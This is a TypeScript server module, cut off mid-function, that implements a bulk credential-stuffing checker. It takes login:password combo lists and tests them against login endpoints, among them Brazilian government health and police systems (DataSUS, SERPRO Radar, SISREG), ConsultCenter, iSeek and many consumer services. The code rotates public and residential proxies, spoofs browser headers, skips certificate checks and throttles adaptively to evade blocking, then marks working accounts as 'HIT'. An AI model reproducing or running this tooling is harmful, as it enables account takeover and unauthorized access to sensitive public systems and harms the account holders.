import { Router, type IRouter } from "express";
import { createHash, createHmac, publicEncrypt, constants, randomUUID } from "node:crypto";
import { execFile }    from "node:child_process";
import { unlinkSync, readFileSync } from "node:fs";
import { getResidentialCreds, proxyCache } from "./proxies.js";

const router: IRouter = Router();

// ── curl-based HTTP helper ────────────────────────────────────────────────────
// Node.js's built-in fetch (undici) times out on DataSUS (cloud-IP block).
// curl uses the system network stack which has no such restriction.
// We shell out to curl for DataSUS requests only.

interface CurlResult {
  statusCode: number;
  headers:    Record<string, string>;
  body:       string;
  location:   string; // value of Location header (from redirect), if any
}

// Maps curl exit codes to short human-readable labels
function curlExitLabel(code: number | null | undefined): string {
  const labels: Record<number, string> = {
    1:  "UNSUPPORTED_PROTOCOL", 2:  "INIT_FAILED",       3:  "BAD_URL",
    5:  "CANT_RESOLVE_PROXY",   6:  "CANT_RESOLVE_HOST", 7:  "CONNECT_FAILED",
    8:  "FTP_WEIRD_REPLY",      9:  "FTP_DENIED",        16: "HTTP2_FRAMING",
    18: "PARTIAL_FILE",         22: "HTTP_RETURNED_ERROR",23: "WRITE_ERROR",
    25: "UPLOAD_FAILED",        26: "READ_ERROR",         27: "OUT_OF_MEMORY",
    28: "TIMEOUT",              33: "RANGE_ERROR",        34: "HTTP_POST_ERROR",
    35: "SSL_CONNECT_ERROR",    51: "PEER_CERT_INVALID",  52: "GOT_NOTHING",
    53: "SSL_ENGINE_NOT_FOUND", 56: "RECV_ERROR",         58: "LOCAL_CERT_PROBLEM",
    60: "SSL_CACERT_VERIFY",    77: "SSL_CACERT_BADFILE", 78: "RESOURCE_NOT_FOUND",
    95: "HTTP3_ERROR",          96: "QUIC_CONNECT_ERROR", 97: "PROXY_ERR",          98: "SSL_CLIENT_CERT",
  };
  return code != null && labels[code] ? `CURL_${code}:${labels[code]}` : `CURL_ERR_${code ?? "?"}`;
}

function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
  // Base args: silent + dump headers to stdout + timeout
  const args = ["-s", "--max-time", String(Math.ceil(timeoutMs / 1000)), "-D", "-", ...argv];

  return new Promise((resolve, reject) => {
    const child = execFile("curl", args, { maxBuffer: 8 * 1024 * 1024 }, (err, stdout, stderr) => {
      // curl exit-code ≠ 0 is ok as long as we got output (e.g. 302 with --max-redirs 0)
      if (!stdout && err) {
        // Prefer curl's own stderr message (e.g. "curl: (7) Failed to connect to...")
        const stderrClean = (stderr ?? "").trim().replace(/^curl:\s*/i, "").slice(0, 120);
        const code = (err as NodeJS.ErrnoException & { code?: number | string }).code;
        const exitCode = typeof code === "number" ? code : parseInt(String(err.message.match(/exit code (\d+)/)?.[1] ?? ""), 10) || null;
        const label = curlExitLabel(exitCode);
        const detail = stderrClean ? `${label} — ${stderrClean}` : label;
        return reject(new Error(detail));
      }

      // Split at first blank line separating headers from body
      // (may have multiple header blocks if curl followed a redirect for the GET phase)
      // We want the LAST header block.
      const blocks = stdout.split(/\r?\n\r?\n/);
      // Find last block starting with HTTP/
      let rawHdr = "";
      let body   = "";
      for (let i = blocks.length - 1; i >= 0; i--) {
        if (blocks[i].trimStart().startsWith("HTTP/")) {
          rawHdr = blocks[i];
          body   = blocks.slice(i + 1).join("\r\n\r\n");
          break;
        }
      }

      const lines      = rawHdr.split(/\r?\n/);
      const statusLine = lines[0] ?? "";
      const statusCode = parseInt(statusLine.split(" ")[1] ?? "0", 10);

      const headers: Record<string, string> = {};
      for (const line of lines.slice(1)) {
        const idx = line.indexOf(":");
        if (idx === -1) continue;
        const key = line.slice(0, idx).trim().toLowerCase();
        const val = line.slice(idx + 1).trim();
        if (!headers[key]) headers[key] = val; // first occurrence wins
      }

      resolve({ statusCode, headers, body, location: headers["location"] ?? "" });
    });

    setTimeout(() => {
      try { child.kill("SIGKILL"); } catch { /**/ }
      reject(new Error("CURL_TIMEOUT"));
    }, timeoutMs + 3_000);
  });
}

// ── Types ─────────────────────────────────────────────────────────────────────
export type CheckStatus = "HIT" | "FAIL" | "ERROR";
export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita" | "tubehosting" | "hostinger" | "vultr" | "digitalocean" | "linode" | "github" | "aws" | "mercadopago" | "ifood" | "riot" | "hetzner" | "roblox" | "epicgames" | "steam" | "playstation" | "xbox" | "paypal" | "cpf";

export interface CheckResult {
  credential: string;
  login:      string;
  status:     CheckStatus;
  detail:     string;
}

export interface CheckerBulkResponse {
  total:   number;
  hits:    number;
  fails:   number;
  errors:  number;
  results: CheckResult[];
}

// ── Shared helpers ────────────────────────────────────────────────────────────
const MOBILE_UA  = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36";
const DESKTOP_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36";

// ── Residential proxy args for curl (streaming checkers) ──────────────────────
// Streaming services block datacenter IPs — route them through residential proxy.
function getResidentialProxyArgs(): string[] {
  const c = getResidentialCreds();
  if (!c) return [];
  return ["-x", `http://${c.username}:${c.password}@${c.host}:${c.port}`];
}

// ── Retry-with-proxy helper ───────────────────────────────────────────────────
// Calls `fn(proxyArgs)` up to `maxAttempts` times, picking a fresh proxy on
// each proxy-level connection failure (curl exit-code, timeout, SOCKS error).
// Returns the first successful CurlResult (even a 4xx/5xx counts as success —
// it means the proxy connected and the server responded).
async function runCurlWithProxyRetry(
  fn:          (proxyArgs: string[]) => string[],
  timeoutMs:   number,
  maxAttempts  = 3,
): Promise<CurlResult> {
  let lastErr: Error = new Error("no_attempts");
  for (let i = 0; i < maxAttempts; i++) {
    const proxyArgs = getStreamingProxyArgs();
    try {
      return await runCurl(fn(proxyArgs), timeoutMs);
    } catch (e) {
      lastErr = e instanceof Error ? e : new Error(String(e));
      // Only retry on connection-level failures (curl exited non-zero)
      if (!lastErr.message.includes("Command failed") &&
          !lastErr.message.includes("CURL_TIMEOUT")) break;
    }
  }
  throw lastErr;
}

// ── Residential-only proxy helper ─────────────────────────────────────────────
// Forces residential proxy — used by services that actively block datacenter IPs
// (Netflix 421, Spotify TLS fingerprint, HBO Max geo-block, etc.)
// Falls back to no-proxy if residential is not configured.
async function runCurlResidential(
  fn:        (proxyArgs: string[]) => string[],
  timeoutMs: number,
): Promise<CurlResult> {
  const proxyArgs = getResidentialProxyArgs(); // always residential, never datacenter
  return runCurl(fn(proxyArgs), timeoutMs);
}

// ── Streaming proxy args: public SOCKS5 first, residential fallback ───────────
// Priority order:
//   1. Public SOCKS5 — tunnels HTTPS natively, no CONNECT needed
//   2. Public HTTP   — may or may not support CONNECT
//   3. Residential   — last resort (current provider blocks CONNECT for HTTPS)
function getStreamingProxyArgs(): string[] {
  const pool  = proxyCache.filter(p => !p.username);       // public proxies only
  const socks5 = pool.filter(p => p.type === "socks5");
  const http   = pool.filter(p => p.type === "http");

  // Prefer SOCKS5 — handles HTTPS without CONNECT
  const candidates = socks5.length > 0 ? socks5 : http;
  if (candidates.length > 0) {
    const top  = candidates.slice(0, 50);                   // top-50 fastest
    const pick = top[Math.floor(Math.random() * top.length)];
    // socks5h = DNS also resolved via proxy (better bypass)
    const scheme = pick.type === "socks5" ? "socks5h" : "http";
    return ["-x", `${scheme}://${pick.host}:${pick.port}`];
  }

  // No public proxies yet — fall back to residential
  return getResidentialProxyArgs();
}
const OPERA_UA   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0";

function parseCookieJar(headers: Headers): string {
  const raw = headers.getSetCookie?.() ?? [];
  return raw.map(c => c.split(";")[0]).join("; ");
}

/** Parse credentials from any format — supports email:pass, user:pass, newline/comma/semicolon separated */
export function parseCredentials(raw: string): Array<{ login: string; password: string }> {
  return raw
    .split(/[\n,;|]+/)
    .map(l => l.trim())
    .filter(Boolean)
    .map(line => {
      const idx = line.indexOf(":");
      if (idx === -1) return null;
      const login    = line.slice(0, idx).trim();
      const password = line.slice(idx + 1).trim();
      if (!login || !password) return null;
      return { login, password };
    })
    .filter((x): x is { login: string; password: string } => x !== null);
}

const sleep = (ms: number) => new Promise<void>(r => setTimeout(r, ms));

// ═══════════════════════════════════════════════════════════════════════════════
//  iSEEK CHECKER — https://iseek.pro/login
//  Logic: GET → extract CSRF _token → POST creds → check redirect location
// ═══════════════════════════════════════════════════════════════════════════════
const ISEEK_URL = "https://iseek.pro/login";
const ISEEK_TIMEOUT = 15_000;

const ISEEK_HEADERS: Record<string, string> = {
  "User-Agent":      DESKTOP_UA,
  "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
  "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
};

function extractCsrfToken(html: string): string | null {
  const m1 = html.match(/name=["']_token["'][^>]*value=["']([^"']+)["']/);
  if (m1) return m1[1];
  const m2 = html.match(/value=["']([^"']+)["'][^>]*name=["']_token["']/);
  if (m2) return m2[1];
  const m3 = html.match(/_token[^>]*value=["']([A-Za-z0-9+/=]{20,80})["']/);
  if (m3) return m3[1];
  return null;
}

async function checkIseek(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;

  // Step 1: GET login page — grab CSRF token + cookies
  let getResp: Response;
  try {
    getResp = await fetch(ISEEK_URL, {
      headers:  { ...ISEEK_HEADERS },
      redirect: "follow",
      signal:   AbortSignal.timeout(ISEEK_TIMEOUT),
    });
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
  }

  const html      = await getResp.text().catch(() => "");
  const cookieJar = parseCookieJar(getResp.headers);
  const token     = extractCsrfToken(html);

  if (!token) return { credential, login, status: "ERROR", detail: "NO_CSRF_TOKEN" };

  // Step 2: POST credentials (no redirect follow — inspect Location header)
  const body = new URLSearchParams({ _token: token, email: login, password });
  const postHeaders: Record<string, string> = {
    ...ISEEK_HEADERS,
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer":      ISEEK_URL,
    "Origin":       "https://iseek.pro",
    ...(cookieJar ? { "Cookie": cookieJar } : {}),
  };

  let postResp: Response;
  try {
    postResp = await fetch(ISEEK_URL, {
      method:   "POST",
      headers:  postHeaders,
      body:     body.toString(),
      redirect: "manual",
      signal:   AbortSignal.timeout(ISEEK_TIMEOUT),
    });
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
  }

  if (postResp.status >= 301 && postResp.status <= 308) {
    const loc = postResp.headers.get("location") ?? "";
    if (loc && !loc.includes("/login")) {
      return { credential, login, status: "HIT", detail: loc.startsWith("/") ? `https://iseek.pro${loc}` : loc };
    }
    return { credential, login, status: "FAIL", detail: loc || "redirect_back_to_login" };
  }

  // Fallback: follow redirects and check final URL
  try {
    const final = await fetch(ISEEK_URL, {
      method:   "POST",
      headers:  postHeaders,
      body:     body.toString(),
      redirect: "follow",
      signal:   AbortSignal.timeout(ISEEK_TIMEOUT),
    });
    const finalUrl = final.url;
    if (finalUrl && !finalUrl.includes("/login")) {
      return { credential, login, status: "HIT", detail: finalUrl };
    }
    return { credential, login, status: "FAIL", detail: finalUrl || "login_page" };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `POST_FOLLOW:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  DATASUS / SI-PNI CHECKER — https://sipni.datasus.gov.br
//  Logic: GET page → extract ViewState + form ID → SHA-512 password → POST → check
// ═══════════════════════════════════════════════════════════════════════════════
const DATASUS_URL = "https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf";
const DATASUS_TIMEOUT = 15_000;

const DATASUS_HEADERS: Record<string, string> = {
  "User-Agent": MOBILE_UA,
  "Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
};

function sha512(text: string): string {
  return createHash("sha512").update(text, "ascii").digest("hex");
}

function sha256(text: string): string {
  return createHash("sha256").update(text).digest("hex");
}

function extractViewState(html: string): string {
  // Standard JSF ViewState hidden input
  const m = html.match(/name=["']javax\.faces\.ViewState["'][^>]*value=["']([^"']+)["']/);
  if (m) return m[1];
  const m2 = html.match(/value=["']([^"']+)["'][^>]*name=["']javax\.faces\.ViewState["']/);
  if (m2) return m2[1];
  return "j_id1"; // fallback default
}

function extractFormId(html: string): string {
  // Try known form IDs: j_idt23, j_idt26, etc.
  const knownIds = ["j_idt23", "j_idt26", "loginForm", "j_idt25", "j_idt24"];
  for (const id of knownIds) {
    if (html.includes(`id="${id}"`)) return id;
  }
  // Fallback: first form with an id
  const m = html.match(/<form[^>]+id=["']([^"']+)["']/);
  if (m) return m[1];
  return "j_idt23";
}

function extractSubmitId(html: string, formId: string): string {
  // Try to find submit button inside the form
  const m = html.match(new RegExp(`${formId}:([\\w]+)[^>]+type=["']submit["']`));
  if (m) return `${formId}:${m[1]}`;
  const m2 = html.match(/id=["']([^"']+)["'][^>]*type=["']submit["']/);
  if (m2) return m2[1];
  return `${formId}:j_idt32`; // default fallback from Python code
}

async function checkDataSUS(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  // Unique cookie jar per session so parallel checks don't share cookies
  const cookieFile = `/tmp/datasus_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    // ── Step 1: GET login page, save cookies ──────────────────────────────
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "-c", cookieFile,                    // save cookies to jar
        "-H", `User-Agent: ${MOBILE_UA}`,
        DATASUS_URL,
      ], DATASUS_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    if (getResult.statusCode !== 200) {
      return { credential, login, status: "ERROR", detail: `HTTP_${getResult.statusCode}` };
    }

    const html      = getResult.body;
    const viewState = extractViewState(html);
    const formId    = extractFormId(html);
    const submitId  = extractSubmitId(html, formId);
    const senhaHash = sha512(password);

    // Build POST body
    const postPairs = [
      [formId, formId],
      ["javax.faces.ViewState", viewState],
      [`${formId}:usuario`, login],
      [`${formId}:senha`, senhaHash],
      [submitId, submitId.includes(":") ? submitId.split(":")[1] : submitId],
    ];
    // Escape each value for shell single-quote safety
    const postData = postPairs
      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
      .join("&");

    // ── Step 2: POST (no redirect follow — inspect Location header) ────────
    let postResult: CurlResult;
    try {
      postResult = await runCurl([
        "-b", cookieFile,                                    // send cookies from jar
        "-H", `User-Agent: ${MOBILE_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "Origin: https://sipni.datasus.gov.br",
        "-H", `Referer: ${DATASUS_URL}`,
        "--data-raw", postData,                              // POST body (no shell quoting issues)
        "--max-redirs", "0",                                 // inspect Location header manually
        DATASUS_URL,
      ], DATASUS_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
    }

    // 302 redirect away from inicio.jsf = LIVE
    const code = postResult.statusCode;
    const loc  = postResult.location;
    if (code >= 301 && code <= 308) {
      if (loc && !loc.includes("inicio.jsf")) {
        return { credential, login, status: "HIT", detail: loc };
      }
      return { credential, login, status: "FAIL", detail: "redirect_back_to_login" };
    }

    // No redirect — check body keywords
    const body2 = postResult.body.toLowerCase();
    if (body2.includes("usu") && (body2.includes("ou senha inv") || body2.includes("senha incorreta"))) {
      return { credential, login, status: "FAIL", detail: "senha_invalida" };
    }
    if (body2.includes("pacienteform") || body2.includes("listapacientetable") || body2.includes("bem-vindo")) {
      return { credential, login, status: "HIT", detail: "dashboard_found" };
    }
    if (body2.includes("inicio.jsf") || body2.includes('type="password"') || body2.includes("type='password'")) {
      return { credential, login, status: "FAIL", detail: "still_on_login" };
    }

    return { credential, login, status: "ERROR", detail: `UNKNOWN_HTTP${code}` };
  } finally {
    // Clean up cookie jar
    try { unlinkSync(cookieFile); } catch { /**/ }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SERPRO CHECKER — https://radar.serpro.gov.br
//  Logic: POST JSON with Android UA → check response for "token" field
//  Note: API uses self-signed cert; curl -k skips verification.
// ═══════════════════════════════════════════════════════════════════════════════
const SERPRO_URL     = "https://radar.serpro.gov.br/core-rest/gip-rest/auth/loginTalonario";
const SERPRO_TIMEOUT = 15_000;
const SERPRO_UA      = "Dalvik/2.1.0 (Linux; Android 14)";

async function checkSerpro(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const body       = JSON.stringify({ imei: "", latitude: 0, longitude: 0, password, username: login });

  try {
    const result = await runCurl([
      "-k", "--compressed",                            // ignore self-signed cert + auto-decompress gzip
      "-X", "POST",
      "-H", `User-Agent: ${SERPRO_UA}`,
      "-H", "Connection: Keep-Alive",
      "-H", "Content-Type: application/json",
      "-d", body,
      SERPRO_URL,
    ], SERPRO_TIMEOUT);

    const text = result.body.trim();

    // Empty or non-JSON (WAF block / gateway error)
    if (!text || result.statusCode === 0 || result.statusCode >= 502) {
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
    }

    // WAF / firewall rejection (HTML response instead of JSON)
    if (text.startsWith("<") || text.includes("Request Rejected") || text.includes("<html")) {
      return { credential, login, status: "ERROR", detail: "WAF_BLOCKED" };
    }

    let json: Record<string, unknown>;
    try { json = JSON.parse(text); } catch { return { credential, login, status: "ERROR", detail: "INVALID_JSON" }; }

    // HIT: response contains a JWT token
    if (json.token && typeof json.token === "string") {
      return { credential, login, status: "HIT", detail: "token_ok" };
    }

    // Expired / blocked account (has stok but no token)
    if (json.stok) {
      return { credential, login, status: "FAIL", detail: `stok_code_${json.code ?? "?"}` };
    }

    // Parse friendly message from API response
    const mensagem = String(json.mensagem ?? json.message ?? json.erro ?? "").trim();

    // Explicit error codes
    const code = String(json.code ?? json.status ?? "").toLowerCase();
    if (code.includes("invalid") || code.includes("wrong") || code.includes("401")) {
      return { credential, login, status: "FAIL", detail: mensagem || `auth_failed:${code}` };
    }

    if (result.statusCode === 401 || result.statusCode === 403) {
      return { credential, login, status: "FAIL", detail: mensagem || `http_${result.statusCode}` };
    }

    // User not found or other API error = FAIL
    if (mensagem) {
      return { credential, login, status: "FAIL", detail: mensagem.slice(0, 100) };
    }

    return { credential, login, status: "FAIL", detail: text.slice(0, 120) };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `SERPRO_EXCEPTION:${String(e)}` };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SISREG III CHECKER — https://sisregiii.saude.gov.br
//  Logic: POST SHA-256 hashed password → parse HTML for profile markers
// ═══════════════════════════════════════════════════════════════════════════════
const SISREG_URL     = "https://sisregiii.saude.gov.br/";
const SISREG_TIMEOUT = 20_000;

async function checkSisreg(login: string, password: string): Promise<CheckResult> {
  const credential  = `${login}:${password}`;
  const senhaHash   = sha256(password);

  const postBody = [
    `usuario=${encodeURIComponent(login)}`,
    `senha=`,
    `senha_256=${senhaHash}`,
    `etapa=ACESSO`,
    `logout=`,
  ].join("&");

  try {
    const result = await runCurl([
      "-k", "--compressed",
      "-X", "POST",
      "-H", "Host: sisregiii.saude.gov.br",
      "-H", "Connection: keep-alive",
      "-H", "Cache-Control: max-age=0",
      "-H", `sec-ch-ua: "Not A(Brand";v="99", "Opera";v="107", "Chromium";v="121"`,
      "-H", "sec-ch-ua-mobile: ?0",
      "-H", `sec-ch-ua-platform: "Windows"`,
      "-H", "Upgrade-Insecure-Requests: 1",
      "-H", `Origin: ${SISREG_URL}`,
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", `User-Agent: ${OPERA_UA}`,
      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "-H", "Sec-Fetch-Site: same-origin",
      "-H", "Sec-Fetch-Mode: navigate",
      "-H", "Sec-Fetch-User: ?1",
      "-H", "Sec-Fetch-Dest: document",
      "-H", `Referer: ${SISREG_URL}cgi-bin/index?logout=1`,
      "-H", "Accept-Language: pt-BR,pt;q=0.9",
      "--data-raw", postBody,
      `${SISREG_URL}`,
    ], SISREG_TIMEOUT);

    if (result.statusCode === 0 || result.statusCode >= 502) {
      return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
    }

    const body = result.body;

    // ── Capture LIMITADO message <CENTER><font color="red"><B>...</B> ─────────
    const limitadoMatch = body.match(/<CENTER><font[^>]*color=["']?red["']?[^>]*><B>(.*?)<\/B>/i);
    const limitado = limitadoMatch ? limitadoMatch[1].trim().slice(0, 80) : null;

    // ── Capture UNIDADE ────────────────────────────────────────────────────────
    const unidadeMatch = body.match(/Unidade:[\s\S]{0,200}?&nbsp;([^<]+)<\/font>/) ||
                         body.match(/Unidade:(.*?)<\/[Dd][Ii][Vv]>/);
    const unidade = unidadeMatch
      ? unidadeMatch[1].replace(/&nbsp;/g, " ").replace(/<[^>]+>/g, "").trim().slice(0, 80)
      : null;

    const extraInfo = [unidade ? `Unidade: ${unidade}` : null, limitado ? `Msg: ${limitado}` : null]
      .filter(Boolean).join(" | ");

    // ── FAIL markers ──────────────────────────────────────────────────────────
    if (body.includes("Login ou senha incorreto(s).")) {
      return { credential, login, status: "FAIL", detail: limitado ? `senha_invalida | ${limitado}` : "senha_invalida" };
    }
    if (body.includes("Este operador foi desativado pelo administrador.")) {
      return { credential, login, status: "FAIL", detail: extraInfo || "conta_desativada" };
    }

    // ── CUSTOM: access restricted by day/time — account IS valid ─────────────
    if (body.includes("Acesso n") && body.includes("o permitido")) {
      return { credential, login, status: "HIT", detail: extraInfo || "acesso_restrito" };
    }

    // ── HIT markers ───────────────────────────────────────────────────────────
    const hitMarkers = ["<p>Perfil</p>", "logout", "Sair", "Principal", "Cadastro"];
    const isHit = hitMarkers.some(m => body.includes(m));
    if (isHit) {
      return { credential, login, status: "HIT", detail: extraInfo || "login_ok" };
    }

    // ── Fallback ──────────────────────────────────────────────────────────────
    if (body.length < 500) {
      return { credential, login, status: "ERROR", detail: "resposta_muito_curta" };
    }

    return { credential, login, status: "FAIL", detail: extraInfo || "nenhum_marcador" };
  } catch (e) {
    return { credential, login, status: "ERROR", detail: `SISREG_EXCEPTION:${String(e)}` };
  }
}

// ── Concurrency pool (no deps needed) ────────────────────────────────────────
// Runs `fn` for every item with at most `concurrency` tasks in parallel,
// preserving result order. Fast replacement for p-limit.
// Each worker catches unexpected throws so the pool NEVER stops early.
async function pMap<T, R>(
  items:       T[],
  fn:          (item: T, idx: number) => Promise<R>,
  concurrency: number,
  onResult?:   (result: R, index: number) => void,
): Promise<R[]> {
  const results: R[] = new Array(items.length);
  let next = 0;
  let done = 0;
  const worker = async () => {
    while (next < items.length) {
      const i = next++;
      try {
        results[i] = await fn(items[i], i);
      } catch (e) {
        // Safety net — mappers should never throw, but if they do the pool continues
        const item = items[i] as Record<string, string>;
        const login = item.login ?? "unknown";
        const pw    = item.password ?? "";
        results[i]  = { credential: `${login}:${pw}`, login, status: "ERROR", detail: `UNCAUGHT:${String(e)}` } as R;
      }
      done++;
      onResult?.(results[i], done);
    }
  };
  await Promise.all(Array.from({ length: Math.min(concurrency, items.length) }, worker));
  return results;
}

// ── Adaptive concurrency semaphore ────────────────────────────────────────────
// Controls effective parallelism at runtime — reduces slots on 429/503 and slowly
// restores them after a period of clean responses.
class AdaptiveSem {
  private slots:       number;
  private readonly max: number;
  private active     = 0;
  private readonly queue: (() => void)[] = [];
  private lastRestore = Date.now();
  private rlHits      = 0;

  constructor(initial: number) { this.slots = initial; this.max = initial; }

  get current() { return this.slots; }

  /** Call when a 429 / 503 is received — reduces concurrency + exponential backoff */
  throttle(): number {
    this.rlHits++;
    this.slots = Math.max(1, Math.floor(this.slots * 0.65));
    this.lastRestore = Date.now();
    // Return backoff ms (capped at 30s)
    return Math.min(3_000 * Math.pow(2, Math.min(this.rlHits - 1, 3)), 30_000);
  }

  /** Call on successful response — slowly restores concurrency after cool-down */
  relax(): void {
    if (this.slots < this.max && Date.now() - this.lastRestore > 15_000) {
      this.slots = Math.min(this.max, this.slots + 1);
      this.rlHits = Math.max(0, this.rlHits - 1);
      this.lastRestore = Date.now();
      const next = this.queue.shift();
      if (next) next();
    }
  }

  /** Acquire a slot — blocks if the adaptive limit is reached */
  async take(): Promise<() => void> {
    if (this.active < this.slots) {
      this.active++;
      return () => { this.active = Math.max(0, this.active - 1); const n = this.queue.shift(); if (n) n(); };
    }
    return new Promise(resolve => {
      this.queue.push(() => {
        this.active++;
        resolve(() => { this.active = Math.max(0, this.active - 1); const n = this.queue.shift(); if (n) n(); });
      });
    });
  }
}

// Targets where a second-pass verification call confirms HITs and reduces false positives
const SECOND_PASS_TARGETS = new Set<CheckerTarget>(["consultcenter", "iseek", "serasa", "netflix", "crunchyroll"]);

// ═══════════════════════════════════════════════════════════════════════════════
//  CONSULT CENTER CHECKER — https://sistema.consultcenter.com.br/users/login
//  Logic: GET page → grab CAKEPHP session cookie → POST creds → detect error/success
// ═══════════════════════════════════════════════════════════════════════════════
const CC_URL     = "https://sistema.consultcenter.com.br/users/login";
const CC_TIMEOUT = 20_000;

async function checkConsultCenter(login: string, password: string): Promise<CheckResult> {
  const credential = `${login}:${password}`;
  const cookieFile = `/tmp/cc_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  // Extracts rich detail from the dashboard HTML after a successful login
  const extractCCDetail = (html: string): string => {
    const h = html.toLowerCase();
    // Senha expirada / troca forçada
    if (h.includes("alterar senha") || h.includes("redefinir senha") ||
        h.includes("senha expirada") || h.includes("sua senha expirou") ||
        h.includes("password expired") || h.includes("change your password") ||
        h.includes("trocar senha") || h.includes("atualizar senha")) {
      return "SENHA_EXPIRADA — conta válida, troca obrigatória";
    }
    // Conta bloqueada/inativa mas com credenciais corretas
    if (h.includes("conta inativa") || h.includes("usuário inativo") ||
        h.includes("acesso bloqueado") || h.includes("sem permissão") ||
        h.includes("sem permissao")) {
      return "CONTA_BLOQUEADA";
    }
    // Extrair nome do usuário
    const namePatterns = [
      /Bem[- ]vindo[,\s]+a?o?\s+([^<\n,!]{2,50})/i,
      /Olá[,\s]+([^<\n,!]{2,50})/i,
      /Ola[,\s]+([^<\n,!]{2,50})/i,
      /class="[^"]*username[^"]*"[^>]*>\s*([^<]{2,50})/i,
      /class="[^"]*user-name[^"]*"[^>]*>\s*([^<]{2,50})/i,
    ];
    for (const re of namePatterns) {
      const m = html.match(re);
      if (m) return `logado:${m[1].trim().slice(0, 60)}`;
    }
    return "dashboard_ok";
  };

  try {
    // ── Step 1: GET login page — obtain session cookie ─────────────────────
    let getResult: CurlResult;
    try {
      getResult = await runCurl([
        "-c", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
        CC_URL,
      ], CC_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `GET_ERROR:${String(e)}` };
    }

    if (getResult.statusCode === 0 || getResult.statusCode >= 500) {
      return { credential, login, status: "ERROR", detail: `GET_HTTP_${getResult.statusCode}` };
    }

    // ── Step 2: POST credentials — follow redirects to final page ──────────
    const postBody = [
      `_method=POST`,
      `data%5BUsuarioLogin%5D%5Busername%5D=${encodeURIComponent(login)}`,
      `data%5BUsuarioLogin%5D%5Bpassword%5D=${encodeURIComponent(password)}`,
    ].join("&");

    let postResult: CurlResult;
    try {
      postResult = await runCurl([
        "-b", cookieFile, "-c", cookieFile,
        "-H", `User-Agent: ${DESKTOP_UA}`,
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
        "-H", `Referer: ${CC_URL}`,
        "-H", "Origin: https://sistema.consultcenter.com.br",
        "--data-raw", postBody,
        "-L", "--max-redirs", "5",  // follow redirects — land on dashboard
        CC_URL,
      ], CC_TIMEOUT);
    } catch (e) {
      return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
    }

    const body = postResult.body;
    const bLow = body.toLowerCase();

    // ── FAIL: explicit error flash (still on login page) ───────────────────
    if (body.includes("alert-danger") || body.includes("incorretos") ||
        body.includes("Usuário e senha") || body.includes("Login ou Senha")) {
      return { credential, login, status: "FAIL", detail: "credentials_invalid" };
    }
    if (bLow.includes("usuário não encontrado") || bLow.includes("usuario nao encontrado")) {
      return { credential, login, status: "FAIL", detail: "usuario_nao_encontrado" };
    }

    // ── HIT: landed on a post-login page ───────────────────────────────────
    const isOnLogin = bLow.includes("/users/login") && bLow.includes('type="password"');
    if (!isOnLogin) {
      // Check for forced password change page — still a HIT (login worked)
      const hLow = bLow;
      if (hLow.includes("alterar senha") || hLow.includes("redefinir senha") ||
          hLow.includes("senha expirada") || hLow.includes("sua senha expirou") ||
          hLow.includes("trocar senha") || hLow.includes("atualizar senha")) {
        return { credential, login, status: "HIT", detail: "SENHA_EXPIRADA — conta válida, troca obrigatória" };
      }
      if (body.includes("Bem-vindo") || body.includes("Sair") || body.includes("logout") ||
          body.includes("Dashboard") || body.includes("dashboard") || body.includes("Painel")) {
        return { credential, login, status: "HIT", detail: extractCCDetail(body) };
      }
      // Post-redirect 200 with session but no obvious markers — likely authenticated
      if (postResult.statusCode === 200 && body.length > 2000) {
